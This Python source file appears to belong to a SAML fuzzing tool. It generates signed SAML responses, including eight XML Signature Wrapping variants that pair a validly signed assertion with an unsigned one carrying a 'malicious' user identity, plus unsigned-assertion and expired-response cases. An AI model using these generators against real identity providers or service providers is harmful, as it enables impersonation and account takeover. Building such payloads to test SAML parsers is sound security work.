"""SAML response factory for fuzzing — including XSW attack variants."""

from __future__ import annotations

import base64
import copy
import uuid
from datetime import datetime, timedelta, timezone

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey
from cryptography.x509.oid import NameOID
from lxml import etree

from src.utils.crypto import generate_rsa_key_pair, generate_self_signed_cert

# Namespace map used throughout.
# Use saml2/saml2p prefixes for compatibility with gosaml2 and other parsers
# that may have hardcoded prefix expectations.
_NS = {
    "saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
    "saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
    "xenc": "http://www.w3.org/2001/04/xmlenc#",
}

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"


class SAMLFactory:
    """Create and manipulate SAML responses for identity broker fuzzing."""

    def __init__(
        self,
        signing_key: RSAPrivateKey | None = None,
        signing_cert: x509.Certificate | None = None,
    ):
        if signing_key is None or signing_cert is None:
            self._key, self._cert = self.generate_self_signed_cert()
        else:
            self._key = signing_key
            self._cert = signing_cert

    # ------------------------------------------------------------------
    # Core response creation
    # ------------------------------------------------------------------

    def create_response(
        self,
        issuer: str,
        destination: str,
        name_id: str,
        attributes: dict,
        in_response_to: str | None = None,
        session_index: str | None = None,
        sign_response: bool = True,
        sign_assertion: bool = True,
    ) -> str:
        """Create a signed SAML Response. Return base64-encoded XML."""
        now = datetime.now(timezone.utc)
        response_id = f"_resp_{uuid.uuid4().hex}"
        assertion_id = f"_assert_{uuid.uuid4().hex}"

        assertion = self._build_assertion(
            assertion_id, issuer, name_id, attributes, now,
            session_index=session_index, in_response_to=in_response_to,
            destination=destination,
        )

        if sign_assertion:
            assertion = self._sign_element(assertion, assertion_id)

        response = self._build_response(
            response_id, issuer, destination, now,
            assertion, in_response_to=in_response_to,
        )

        if sign_response:
            response = self._sign_element(response, response_id)

        xml_bytes = etree.tostring(response, xml_declaration=True, encoding="UTF-8")
        return base64.b64encode(xml_bytes).decode("ascii")

    # ------------------------------------------------------------------
    # XSW attack variants
    # ------------------------------------------------------------------

    def create_xsw_response(
        self,
        variant: int,
        legitimate_name_id: str,
        malicious_name_id: str,
        issuer: str,
        destination: str,
        attributes: dict,
        in_response_to: str | None = None,
    ) -> str:
        """Create a SAML Response with XML Signature Wrapping attack.

        The response has a cryptographically valid signature over the
        *legitimate* assertion, but the *malicious* (unsigned) assertion is
        positioned so a naive processor will consume it instead.
        """
        now = datetime.now(timezone.utc)
        legit_id = f"_legit_{uuid.uuid4().hex}"
        evil_id = f"_evil_{uuid.uuid4().hex}"
        resp_id = f"_resp_{uuid.uuid4().hex}"

        legit = self._build_assertion(
            legit_id, issuer, legitimate_name_id, attributes, now,
            destination=destination,
            in_response_to=in_response_to,
        )
        legit_signed = self._sign_element(legit, legit_id)

        evil = self._build_assertion(
            evil_id, issuer, malicious_name_id, attributes, now,
            destination=destination,
            in_response_to=in_response_to,
        )

        handler = {
            1: self._xsw1,
            2: self._xsw2,
            3: self._xsw3,
            4: self._xsw4,
            5: self._xsw5,
            6: self._xsw6,
            7: self._xsw7,
            8: self._xsw8,
        }.get(variant)

        if handler is None:
            raise ValueError(f"XSW variant must be 1-8, got {variant}")

        response = handler(resp_id, issuer, destination, now, legit_signed, evil, in_response_to)
        xml_bytes = etree.tostring(response, xml_declaration=True, encoding="UTF-8")
        return base64.b64encode(xml_bytes).decode("ascii")

    # --- Individual XSW variant builders ---

    def _xsw1(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Move signed assertion to end, add evil at original position."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        resp.append(copy.deepcopy(legit))
        return resp

    def _xsw2(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Detached signature with evil assertion prepended."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        # Extract signature from legit and append to response
        sig = legit.find(f"{{{DS_NS}}}Signature")
        if sig is not None:
            legit_copy = copy.deepcopy(legit)
            resp.append(legit_copy)
        return resp

    def _xsw3(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Evil assertion wrapping the signed assertion."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        evil_in_resp = resp.find(f"{{{SAML_NS}}}Assertion")
        if evil_in_resp is not None:
            evil_in_resp.append(copy.deepcopy(legit))
        return resp

    def _xsw4(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Evil assertion adjacent to signed (both in Response)."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        resp.append(copy.deepcopy(legit))
        return resp

    def _xsw5(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Move signed assertion into Signature.Object, evil in Response body."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        # Create a ds:Signature wrapper with Object
        sig_elem = legit.find(f"{{{DS_NS}}}Signature")
        if sig_elem is not None:
            sig_copy = copy.deepcopy(sig_elem)
            obj = etree.SubElement(sig_copy, f"{{{DS_NS}}}Object")
            # Put the whole legit assertion into Object
            legit_no_sig = copy.deepcopy(legit)
            s = legit_no_sig.find(f"{{{DS_NS}}}Signature")
            if s is not None:
                legit_no_sig.remove(s)
            obj.append(legit_no_sig)
            resp.append(sig_copy)
        return resp

    def _xsw6(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Move signed to Extensions, evil in Response body."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        ext = etree.SubElement(resp, f"{{{SAMLP_NS}}}Extensions")
        ext.append(copy.deepcopy(legit))
        return resp

    def _xsw7(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Add unsigned evil assertion AFTER signed assertion."""
        resp = self._build_response(resp_id, issuer, dest, now, legit, in_response_to=irt)
        resp.append(copy.deepcopy(evil))
        return resp

    def _xsw8(self, resp_id, issuer, dest, now, legit, evil, irt=None):
        """Move signed to nested structure, evil as first child."""
        resp = self._build_response(resp_id, issuer, dest, now, evil, in_response_to=irt)
        wrapper = etree.SubElement(resp, f"{{{SAML_NS}}}Advice")
        wrapper.append(copy.deepcopy(legit))
        return resp

    # ------------------------------------------------------------------
    # Special-purpose responses
    # ------------------------------------------------------------------

    def create_unsigned_assertion_in_signed_response(
        self,
        issuer: str,
        destination: str,
        malicious_name_id: str,
        attributes: dict,
    ) -> str:
        """Response is signed, but the assertion inside is NOT individually signed."""
        now = datetime.now(timezone.utc)
        resp_id = f"_resp_{uuid.uuid4().hex}"
        assertion_id = f"_assert_{uuid.uuid4().hex}"

        assertion = self._build_assertion(
            assertion_id, issuer, malicious_name_id, attributes, now,
            destination=destination,
        )
        response = self._build_response(resp_id, issuer, destination, now, assertion)
        response = self._sign_element(response, resp_id)

        xml_bytes = etree.tostring(response, xml_declaration=True, encoding="UTF-8")
        return base64.b64encode(xml_bytes).decode("ascii")

    def create_expired_response(
        self,
        issuer: str,
        destination: str,
        name_id: str,
        attributes: dict,
        expired_minutes_ago: int = 60,
    ) -> str:
        """Create a validly signed but expired SAML Response."""
        past = datetime.now(timezone.utc) - timedelta(minutes=expired_minutes_ago + 5)
        resp_id = f"_resp_{uuid.uuid4().hex}"
        assertion_id = f"_assert_{uuid.uuid4().hex}"

        assertion = self._build_assertion(
            assertion_id, issuer, name_id, attributes, past,
            not_on_or_after=past + timedelta(minutes=5),
            destination=destination,
        )
        assertion = self._sign_element(assertion, assertion_id)
        response = self._build_response(resp_id, issuer, destination, past, assertion)
        response = self._sign_element(response, resp_id)

        xml_bytes = etree.tostring(response, xml_declaration=True, encoding="UTF-8")
        return base64.b64encode(xml_bytes).decode("ascii")

    # ------------------------------------------------------------------
    # IdP metadata
    # ------------------------------------------------------------------

    def get_idp_metadata(self, entity_id: str, sso_url: str) -> str:
        cert_pem = self._cert.public_bytes(serialization.Encoding.PEM).decode()
        cert_b64 = "".join(cert_pem.split("\n")[1:-2])
        md = etree.Element(
            "EntityDescriptor",
            nsmap={"md": "urn:oasis:names:tc:SAML:2.0:metadata",
                   "ds": DS_NS},
            attrib={"entityID": entity_id},
        )
        md.tag = "{urn:oasis:names:tc:SAML:2.0:metadata}EntityDescriptor"
        idp = etree.SubElement(
            md, "{urn:oasis:names:tc:SAML:2.0:metadata}IDPSSODescriptor",
            attrib={"protocolSupportEnumeration": "urn:oasis:names:tc:SAML:2.0:protocol"},
        )
        kd = etree.SubElement(idp, "{urn:oasis:names:tc:SAML:2.0:metadata}KeyDescriptor",
                              attrib={"use": "signing"})
        ki = etree.SubElement(kd, f"{{{DS_NS}}}KeyInfo")
        x509data = etree.SubElement(ki, f"{{{DS_NS}}}X509Data")
        x509cert = etree.SubElement(x509data, f"{{{DS_NS}}}X509Certificate")
        x509cert.text = cert_b64

        etree.SubElement(
            idp,
            "{urn:oasis:names:tc:SAML:2.0:metadata}SingleSignOnService",
            attrib={
                "Binding": "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST",
                "Location": sso_url,
            },
        )
        return etree.tostring(md, encoding="unicode")

    # ------------------------------------------------------------------
    # Static helpers
    # ------------------------------------------------------------------

    @staticmethod
    def generate_self_signed_cert(
        common_name: str = "VALENCE Test IdP",
    ) -> tuple[RSAPrivateKey, x509.Certificate]:
        key, _ = generate_rsa_key_pair()
        cert = generate_self_signed_cert(key, cn=common_name)
        return key, cert

    # ------------------------------------------------------------------
    # Internal XML builders
    # ------------------------------------------------------------------

    def _build_assertion(
        self,
        assertion_id: str,
        issuer: str,
        name_id: str,
        attributes: dict,
        issue_instant: datetime,
        not_on_or_after: datetime | None = None,
        session_index: str | None = None,
        in_response_to: str | None = None,
        destination: str | None = None,
        include_onetimeuse: bool = False,
    ) -> etree._Element:
        not_before = issue_instant
        if not_on_or_after is None:
            not_on_or_after = issue_instant + timedelta(minutes=5)

        assertion = etree.Element(
            f"{{{SAML_NS}}}Assertion",
            nsmap={"saml2": SAML_NS, "saml2p": SAMLP_NS},
            attrib={
                "ID": assertion_id,
                "IssueInstant": issue_instant.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "Version": "2.0",
            },
        )

        iss = etree.SubElement(assertion, f"{{{SAML_NS}}}Issuer")
        iss.text = issuer

        subject = etree.SubElement(assertion, f"{{{SAML_NS}}}Subject")
        nid = etree.SubElement(
            subject,
            f"{{{SAML_NS}}}NameID",
            attrib={"Format": "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"},
        )
        nid.text = name_id

        sc = etree.SubElement(subject, f"{{{SAML_NS}}}SubjectConfirmation",
                              attrib={"Method": "urn:oasis:names:tc:SAML:2.0:cm:bearer"})
        sc_data_attrs = {
            "NotOnOrAfter": not_on_or_after.strftime("%Y-%m-%dT%H:%M:%SZ"),
        }
        if destination:
            sc_data_attrs["Recipient"] = destination
        if in_response_to:
            sc_data_attrs["InResponseTo"] = in_response_to
        etree.SubElement(sc, f"{{{SAML_NS}}}SubjectConfirmationData", attrib=sc_data_attrs)

        conditions = etree.SubElement(
            assertion,
            f"{{{SAML_NS}}}Conditions",
            attrib={
                "NotBefore": not_before.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "NotOnOrAfter": not_on_or_after.strftime("%Y-%m-%dT%H:%M:%SZ"),
            },
        )
        aud_restriction = etree.SubElement(conditions, f"{{{SAML_NS}}}AudienceRestriction")
        aud = etree.SubElement(aud_restriction, f"{{{SAML_NS}}}Audience")
        aud.text = destination or issuer

        if include_onetimeuse:
            etree.SubElement(conditions, f"{{{SAML_NS}}}OneTimeUse")

        authn_stmt_attrs = {
            "AuthnInstant": issue_instant.strftime("%Y-%m-%dT%H:%M:%SZ"),
        }
        if session_index:
            authn_stmt_attrs["SessionIndex"] = session_index
        authn_stmt = etree.SubElement(assertion, f"{{{SAML_NS}}}AuthnStatement",
                                      attrib=authn_stmt_attrs)
        actx = etree.SubElement(authn_stmt, f"{{{SAML_NS}}}AuthnContext")
        acr = etree.SubElement(actx, f"{{{SAML_NS}}}AuthnContextClassRef")
        acr.text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

        if attributes:
            attr_stmt = etree.SubElement(assertion, f"{{{SAML_NS}}}AttributeStatement")
            for name, value in attributes.items():
                attr = etree.SubElement(
                    attr_stmt,
                    f"{{{SAML_NS}}}Attribute",
                    attrib={"Name": name},
                )
                av = etree.SubElement(attr, f"{{{SAML_NS}}}AttributeValue")
                av.text = str(value)

        return assertion

    def _build_response(
        self,
        response_id: str,
        issuer: str,
        destination: str,
        issue_instant: datetime,
        assertion: etree._Element,
        in_response_to: str | None = None,
    ) -> etree._Element:
        attribs = {
            "ID": response_id,
            "Version": "2.0",
            "IssueInstant": issue_instant.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "Destination": destination,
        }
        if in_response_to:
            attribs["InResponseTo"] = in_response_to

        response = etree.Element(
            f"{{{SAMLP_NS}}}Response",
            nsmap={"saml2p": SAMLP_NS, "saml2": SAML_NS},
            attrib=attribs,
        )

        iss = etree.SubElement(response, f"{{{SAML_NS}}}Issuer")
        iss.text = issuer

        status = etree.SubElement(response, f"{{{SAMLP_NS}}}Status")
        etree.SubElement(
            status,
            f"{{{SAMLP_NS}}}StatusCode",
            attrib={"Value": "urn:oasis:names:tc:SAML:2.0:status:Success"},
        )

        response.append(copy.deepcopy(assertion))
        return response

    def _sign_element(self, element: etree._Element, reference_id: str) -> etree._Element:
        """Sign an XML element using enveloped XML signature."""
        from signxml import XMLSigner, methods

        cert_pem = self._cert.public_bytes(serialization.Encoding.PEM)
        key_pem = self._key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
        signer = XMLSigner(
            method=methods.enveloped,
            digest_algorithm="sha256",
            signature_algorithm="rsa-sha256",
            c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
        )
        signed = signer.sign(
            element,
            key=key_pem,
            cert=cert_pem,
            reference_uri=f"#{reference_id}",
        )
        return signed
